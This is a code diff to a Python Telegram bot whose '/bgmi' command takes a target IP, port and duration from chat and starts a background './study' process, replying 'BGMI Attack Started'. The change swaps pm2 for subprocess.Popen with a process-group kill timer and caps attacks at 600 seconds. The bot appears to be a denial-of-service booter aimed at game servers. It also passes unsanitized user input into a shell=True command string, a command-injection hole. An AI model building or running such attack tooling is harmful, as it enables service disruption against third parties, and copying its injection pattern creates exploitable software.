@@ -292,6 +292,8 @@ COOLDOWN_TIME =0
 def handle_bgmi(message):
     import datetime
     import subprocess
+    import threading
+    import os
     import signal
 
     user_id = str(message.chat.id)
@@ -314,7 +316,6 @@ def handle_bgmi(message):
         bgmi_cooldown[user_id] = datetime.datetime.now()
 
     command = message.text.strip().split()
-
     if len(command) != 4:
         bot.reply_to(message, "✅ Usage: /bgmi <target> <port> <time>")
         return
@@ -328,36 +329,33 @@ def handle_bgmi(message):
         bot.reply_to(message, "❌ Port and time must be numbers.")
         return
 
-    if time > 1000000:
+    if time > 600:
         bot.reply_to(message, "⚠️ Error: Time interval must be less than 600 seconds.")
         return
 
+    # Logging
     record_command_logs(user_id, '/bgmi', target, port, time)
     log_command(user_id, target, port, time)
     start_attack_reply(message, target, port, time)
 
-    import threading
-    import subprocess
-
-    pm2_process_name = f"bgmi_{user_id}"
-    full_command = f"pm2 start ./run_study.sh --name {pm2_process_name} -- {target} {port} {time}"
+    full_command = f"./study {target} {port} {time} 200"
 
     try:
-        subprocess.run(full_command, shell=True)
+        # Start the process in the background
+        process = subprocess.Popen(full_command, shell=True, preexec_fn=os.setsid)
 
-        # Schedule PM2 cleanup after time + buffer
+        # Schedule termination after `time` seconds
         def cleanup():
-            subprocess.run(f"pm2 stop {pm2_process_name}", shell=True)
-            subprocess.run(f"pm2 delete {pm2_process_name}", shell=True)
+            os.killpg(os.getpgid(process.pid), signal.SIGTERM)
 
-        threading.Timer(time + 2, cleanup).start()
+        threading.Timer(time, cleanup).start()
 
         response = (
             f"✅ BGMI Attack Started.\n"
             f"🎯 Target: {target}\n"
             f"📍 Port: {port}\n"
             f"⏱️ Duration: {time}s\n"
-            f"🧼 Will auto-clean after completion."
+            f"🛑 Process will be auto-killed after {time} seconds."
         )
 
     except Exception as e:
